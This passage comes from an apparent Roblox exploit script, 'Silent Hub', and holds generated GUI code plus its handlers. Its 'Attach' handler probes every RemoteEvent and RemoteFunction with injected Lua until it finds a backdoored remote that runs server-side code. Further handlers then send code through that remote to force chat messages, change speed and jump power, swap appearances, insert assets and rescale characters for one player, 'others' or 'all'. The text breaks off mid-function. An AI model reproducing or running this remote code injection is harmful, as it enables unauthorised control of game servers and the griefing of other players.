G2L["12c"] = Instance.new("LocalScript", G2L["12b"]);



-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Players.UIStroke
G2L["12d"] = Instance.new("UIStroke", G2L["12b"]);
G2L["12d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["12d"]["Thickness"] = 1.8;
G2L["12d"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Settings
G2L["12e"] = Instance.new("TextButton", G2L["120"]);
G2L["12e"]["TextWrapped"] = true;
G2L["12e"]["BorderSizePixel"] = 0;
G2L["12e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12e"]["TextSize"] = 11;
G2L["12e"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["12e"]["RichText"] = true;
G2L["12e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12e"]["Size"] = UDim2.new(0, 68, 0, 22);
G2L["12e"]["Name"] = [[Settings]];
G2L["12e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12e"]["Text"] = [[SETTINGS]];
G2L["12e"]["Position"] = UDim2.new(0.56321, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Settings.LocalScript
G2L["12f"] = Instance.new("LocalScript", G2L["12e"]);



-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Settings.UIStroke
G2L["130"] = Instance.new("UIStroke", G2L["12e"]);
G2L["130"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["130"]["Thickness"] = 1.8;
G2L["130"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Credits
G2L["131"] = Instance.new("TextButton", G2L["120"]);
G2L["131"]["TextWrapped"] = true;
G2L["131"]["BorderSizePixel"] = 0;
G2L["131"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["131"]["TextSize"] = 11;
G2L["131"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["131"]["RichText"] = true;
G2L["131"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["131"]["Size"] = UDim2.new(0, 68, 0, 22);
G2L["131"]["Name"] = [[Credits]];
G2L["131"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["131"]["Text"] = [[CREDITS]];
G2L["131"]["Position"] = UDim2.new(0.72526, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Credits.LocalScript
G2L["132"] = Instance.new("LocalScript", G2L["131"]);



-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Credits.UIStroke
G2L["133"] = Instance.new("UIStroke", G2L["131"]);
G2L["133"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["133"]["Thickness"] = 1.8;
G2L["133"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Footer
G2L["134"] = Instance.new("Frame", G2L["5"]);
G2L["134"]["BorderSizePixel"] = 0;
G2L["134"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["134"]["Size"] = UDim2.new(0, 500, 0, 27);
G2L["134"]["Position"] = UDim2.new(0, 0, 0.88845, 0);
G2L["134"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["134"]["Name"] = [[Footer]];
G2L["134"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Silent Hub.Main.MainContainer.Footer.Version
G2L["135"] = Instance.new("TextLabel", G2L["134"]);
G2L["135"]["BorderSizePixel"] = 0;
G2L["135"]["TextSize"] = 18;
G2L["135"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["135"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["135"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["135"]["BackgroundTransparency"] = 1;
G2L["135"]["Size"] = UDim2.new(0, 63, 0, 27);
G2L["135"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["135"]["Text"] = [[version here]];
G2L["135"]["Name"] = [[Version]];
G2L["135"]["Position"] = UDim2.new(0.875, 0, 0, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Footer.Version.LocalScript
G2L["136"] = Instance.new("LocalScript", G2L["135"]);



-- StarterGui.Silent Hub.Main.MainContainer.Footer.Button
G2L["137"] = Instance.new("TextButton", G2L["134"]);
G2L["137"]["TextWrapped"] = true;
G2L["137"]["BorderSizePixel"] = 0;
G2L["137"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["137"]["TextSize"] = 12;
G2L["137"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["137"]["RichText"] = true;
G2L["137"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["137"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["137"]["Name"] = [[Button]];
G2L["137"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["137"]["Text"] = [[R6]];
G2L["137"]["Position"] = UDim2.new(0.015, 0, 0.15, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Footer.Button.LocalScript
G2L["138"] = Instance.new("LocalScript", G2L["137"]);



-- StarterGui.Silent Hub.Main.MainContainer.Footer.Button.UIStroke
G2L["139"] = Instance.new("UIStroke", G2L["137"]);
G2L["139"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["139"]["Thickness"] = 1.8;
G2L["139"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Footer.Button
G2L["13a"] = Instance.new("TextButton", G2L["134"]);
G2L["13a"]["TextWrapped"] = true;
G2L["13a"]["BorderSizePixel"] = 0;
G2L["13a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13a"]["TextSize"] = 12;
G2L["13a"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["13a"]["RichText"] = true;
G2L["13a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13a"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["13a"]["Name"] = [[Button]];
G2L["13a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13a"]["Text"] = [[RE]];
G2L["13a"]["Position"] = UDim2.new(0.076, 0, 0.15, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Footer.Button.LocalScript
G2L["13b"] = Instance.new("LocalScript", G2L["13a"]);



-- StarterGui.Silent Hub.Main.MainContainer.Footer.Button.UIStroke
G2L["13c"] = Instance.new("UIStroke", G2L["13a"]);
G2L["13c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["13c"]["Thickness"] = 1.8;
G2L["13c"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Footer.TextButton
G2L["13d"] = Instance.new("TextButton", G2L["134"]);
G2L["13d"]["BorderSizePixel"] = 0;
G2L["13d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13d"]["TextSize"] = 18;
G2L["13d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13d"]["RichText"] = true;
G2L["13d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13d"]["Size"] = UDim2.new(0, 132, 0, 27);
G2L["13d"]["BackgroundTransparency"] = 1;
G2L["13d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13d"]["Text"] = [[dsc.gg/teamc00lkidd]];
G2L["13d"]["Position"] = UDim2.new(0.368, 0, 0, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Footer.TextButton.LocalScript
G2L["13e"] = Instance.new("LocalScript", G2L["13d"]);



-- StarterGui.Silent Hub.Main.Toggle
G2L["13f"] = Instance.new("TextButton", G2L["2"]);
G2L["13f"]["BorderSizePixel"] = 0;
G2L["13f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13f"]["TextSize"] = 25;
G2L["13f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13f"]["FontFace"] = Font.new([[rbxasset://fonts/families/RobotoMono.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["13f"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["13f"]["BackgroundTransparency"] = 0.7;
G2L["13f"]["Name"] = [[Toggle]];
G2L["13f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13f"]["Text"] = [[-]];
G2L["13f"]["Position"] = UDim2.new(0.96, 0, 0, 0);


-- StarterGui.Silent Hub.Main.Toggle.LocalScript
G2L["140"] = Instance.new("LocalScript", G2L["13f"]);



-- StarterGui.Silent Hub.Main.UIScale
G2L["141"] = Instance.new("UIScale", G2L["2"]);



-- StarterGui.Silent Hub.AcquiredRemote
G2L["142"] = Instance.new("StringValue", G2L["1"]);
G2L["142"]["Name"] = [[AcquiredRemote]];


-- StarterGui.Silent Hub.RemotesEnabled
G2L["143"] = Instance.new("BoolValue", G2L["1"]);
G2L["143"]["Name"] = [[RemotesEnabled]];


-- StarterGui.Silent Hub.Load
G2L["144"] = Instance.new("LocalScript", G2L["1"]);
G2L["144"]["Name"] = [[Load]];


-- StarterGui.Silent Hub.LastUpdated
G2L["145"] = Instance.new("StringValue", G2L["1"]);
G2L["145"]["Name"] = [[LastUpdated]];
G2L["145"]["Value"] = [[4/17/2026]];


-- StarterGui.Silent Hub.Version
G2L["146"] = Instance.new("StringValue", G2L["1"]);
G2L["146"]["Name"] = [[Version]];
G2L["146"]["Value"] = [[1.0.1]];


-- StarterGui.Silent Hub.Main.UIDrag
local function C_3()
local script = G2L["3"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.1
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_3);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage.Attach.Attach
local function C_b()
local script = G2L["b"];
	local button = script.Parent
	
	local remoteornah = button.Parent.Parent.Parent.Parent.Parent.RemotesEnabled
	local remotename = button.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local AcquiredRemote = nil
	local isAcquiring = false
	
	
	local function reset()
		AcquiredRemote = nil
		remoteornah.Value = false
	
		button.Parent.Visible = true
		button.Parent.Parent.Parent.Tabs.Visible = false
		button.Parent.Parent.Server.Visible = false
	
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "Remote lost. Returning to attach screen."
		})
	end
	
	button.MouseButton1Click:Connect(function()
		if isAcquiring then return end
		isAcquiring = true
	
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "Scanning for remotes..."
		})
	
		local RemoteList = {}
		for _, v in pairs(game:GetDescendants()) do
			if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) and v.Name ~= "UpdateCurrentCall" then
				table.insert(RemoteList, v)
			end
		end
	
		for _, remote in ipairs(RemoteList) do
			if AcquiredRemote then break end
	
			print(remote.Name)
	
			local code = [=[
				local l = Instance.new("Folder")
				l.Name = "LOL"
				l.Parent = game.JointsService
				wait(1)
				l:Destroy()
			]=]
	
			if remote:IsA("RemoteEvent") then
				pcall(function()
					remote:FireServer(code)
				end)
			elseif remote:IsA("RemoteFunction") then
				pcall(function()
					remote:InvokeServer(code)
				end)
			end
	
			wait(0.4)
	
			local found = nil
			for _, v in pairs(game.JointsService:GetChildren()) do
				if v:IsA("Folder") and v.Name == "LOL" then
					found = v
					break
				end
			end
	
			if found and found.Name == "LOL" then
				AcquiredRemote = remote
				remoteornah.Value = true
	
				remotename.Value = remote:GetFullName():gsub("^game%.", "")
	
				button.Parent.Visible = false
				button.Parent.Parent.Parent.Tabs.Visible = true
				button.Parent.Parent.Server.Visible = true
	
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Silent Hub",
					Text = "Attached to remote: " .. remote.Name
				})
				break
			end
		end
	
	
		if not AcquiredRemote then
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Silent Hub",
				Text = "No backdoored remote found, destroying GUI..."
			})
			wait(3)
			script.Parent.Parent.Parent.Parent.Parent.Parent:Destroy()
		end
	
	
		if AcquiredRemote and not AcquiredRemote:IsDescendantOf(game) then
			reset()
		end
	
		isAcquiring = false
	end)
end;
task.spawn(C_b);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.StartingPage.UpdateDate.LocalScript
local function C_f()
local script = G2L["f"];
	local lastupdated = script.Parent.Parent.Parent.Parent.Parent.Parent.LastUpdated
	local text = script.Parent
	
	text.Text = "Last Updated: "..lastupdated.Value
end;
task.spawn(C_f);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
local function C_19()
local script = G2L["19"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Parent.Main.PlayerName
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character and player.Character:FindFirstChild("Head") then
				game:GetService("Chat"):Chat(player.Character.Head, "]] .. text .. [[", Enum.ChatColor.White)
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character and player.Character:FindFirstChild("Head") then
				game:GetService("Chat"):Chat(player.Character.Head, "]] .. text .. [[", Enum.ChatColor.White)
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character and player.Character:FindFirstChild("Head") then
			game:GetService("Chat"):Chat(player.Character.Head, "]] .. text .. [[", Enum.ChatColor.White)
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_19);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
local function C_1c()
local script = G2L["1c"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Parent.Main.PlayerName
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				player.Character.Humanoid.WalkSpeed = ]] .. text .. [[
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				player.Character.Humanoid.WalkSpeed = ]] .. text .. [[
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			player.Character.Humanoid.WalkSpeed = ]] .. text .. [[
		end
		]]
		end
	
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_1c);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
local function C_1f()
local script = G2L["1f"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Parent.Main.PlayerName
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				player.Character.Humanoid.JumpPower = ]] .. text .. [[
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
					player.Character.Humanoid.JumpPower = ]] .. text .. [[
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
				player.Character.Humanoid.JumpPower = ]] .. text .. [[
		end
		]]
		end
	
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_1f);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
local function C_22()
local script = G2L["22"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Parent.Main.PlayerName
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
					player.CharacterAppearanceId = ]] .. input.Text .. [[
					player:LoadCharacter()
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				player.CharacterAppearanceId = ]] .. input.Text .. [[
					player:LoadCharacter()
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			player.CharacterAppearanceId = ]] .. input.Text .. [[
					player:LoadCharacter()
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_22);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
local function C_25()
local script = G2L["25"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Parent.Main.PlayerName
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				local tool = game:GetService("InsertService"):LoadAsset(]] .. text ..[[)
			for i,v in pairs(tool:GetChildren()) do
				v.Parent = player.Backpack
			end
			tool:Destroy()
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				local tool = game:GetService("InsertService"):LoadAsset(]] .. text ..[[)
			for i,v in pairs(tool:GetChildren()) do
				v.Parent = player.Backpack
			end
			tool:Destroy()
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			local tool = game:GetService("InsertService"):LoadAsset(]] .. text ..[[)
			for i,v in pairs(tool:GetChildren()) do
				if v then
				v.Parent = player.Backpack
				tool:Destroy()
				else
				tool.Parent = player.Backpack
				end
			end
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_25);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
local function C_28()
local script = G2L["28"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Parent.Main.PlayerName
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				function scale(chr,scl)
		
			for _,v in pairs(player.Character:GetChildren()) do
				if v:IsA('Hat') then
					v:Clone()
					v.Parent = game.Lighting
				end
			end
				
		    local Head = chr['Head']
		    local Torso = chr['Torso']
		    local LA = chr['Left Arm']
		    local RA = chr['Right Arm']
		    local LL = chr['Left Leg']
		    local RL = chr['Right Leg']
		    local HRP = chr['HumanoidRootPart']
		
		    wait(0.1)
		   
		    Head.formFactor = 3
		    Torso.formFactor = 3
		    LA.formFactor = 3
		    RA.formFactor = 3
		    LL.formFactor = 3
		    RL.formFactor = 3
		    HRP.formFactor = 3
		    
		    Head.Size = Vector3.new(scl * 2, scl, scl)
		    Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
		    LA.Size = Vector3.new(scl, scl * 2, scl)
		    RA.Size = Vector3.new(scl, scl * 2, scl)
		    LL.Size = Vector3.new(scl, scl * 2, scl)
		    RL.Size = Vector3.new(scl, scl * 2, scl)
		    HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
		    
		    local Motor1 = Instance.new('Motor6D', Torso)
		    Motor1.Part0 = Torso
		    Motor1.Part1 = Head
		    Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.Name = 'Neck'
				    
		    local Motor2 = Instance.new('Motor6D', Torso)
		    Motor2.Part0 = Torso
		    Motor2.Part1 = LA
		    Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.Name = 'Left Shoulder'
		    
		    local Motor3 = Instance.new('Motor6D', Torso)
		    Motor3.Part0 = Torso
		    Motor3.Part1 = RA
		    Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.Name = 'Right Shoulder'
		    
		    local Motor4 = Instance.new('Motor6D', Torso)
		    Motor4.Part0 = Torso
		    Motor4.Part1 = LL
		    Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.Name = 'Left Hip'
		    
		    local Motor5 = Instance.new('Motor6D', Torso)
		    Motor5.Part0 = Torso
		    Motor5.Part1 = RL
		    Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.Name = 'Right Hip'
		    
		    local Motor6 = Instance.new('Motor6D', HRP)
		    Motor6.Part0 = HRP
		    Motor6.Part1 = Torso
		    Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		    Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		        
		end
		
		scale(player.Character, ]] .. input.Text .. [[)
		
		for _,v in pairs(game.Lighting:GetChildren()) do
			if v:IsA('Hat') then
				v.Parent = player.Character
			end
		end
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
			function scale(chr,scl)
		
			for _,v in pairs(player.Character:GetChildren()) do
				if v:IsA('Hat') then
					v:Clone()
					v.Parent = game.Lighting
				end
			end
				
		    local Head = chr['Head']
		    local Torso = chr['Torso']
		    local LA = chr['Left Arm']
		    local RA = chr['Right Arm']
		    local LL = chr['Left Leg']
		    local RL = chr['Right Leg']
		    local HRP = chr['HumanoidRootPart']
		
		    wait(0.1)
		   
		    Head.formFactor = 3
		    Torso.formFactor = 3
		    LA.formFactor = 3
		    RA.formFactor = 3
		    LL.formFactor = 3
		    RL.formFactor = 3
		    HRP.formFactor = 3
		    
		    Head.Size = Vector3.new(scl * 2, scl, scl)
		    Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
		    LA.Size = Vector3.new(scl, scl * 2, scl)
		    RA.Size = Vector3.new(scl, scl * 2, scl)
		    LL.Size = Vector3.new(scl, scl * 2, scl)
		    RL.Size = Vector3.new(scl, scl * 2, scl)
		    HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
		    
		    local Motor1 = Instance.new('Motor6D', Torso)
		    Motor1.Part0 = Torso
		    Motor1.Part1 = Head
		    Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.Name = 'Neck'
				    
		    local Motor2 = Instance.new('Motor6D', Torso)
		    Motor2.Part0 = Torso
		    Motor2.Part1 = LA
		    Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.Name = 'Left Shoulder'
		    
		    local Motor3 = Instance.new('Motor6D', Torso)
		    Motor3.Part0 = Torso
		    Motor3.Part1 = RA
		    Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.Name = 'Right Shoulder'
		    
		    local Motor4 = Instance.new('Motor6D', Torso)
		    Motor4.Part0 = Torso
		    Motor4.Part1 = LL
		    Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.Name = 'Left Hip'
		    
		    local Motor5 = Instance.new('Motor6D', Torso)
		    Motor5.Part0 = Torso
		    Motor5.Part1 = RL
		    Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.Name = 'Right Hip'
		    
		    local Motor6 = Instance.new('Motor6D', HRP)
		    Motor6.Part0 = HRP
		    Motor6.Part1 = Torso
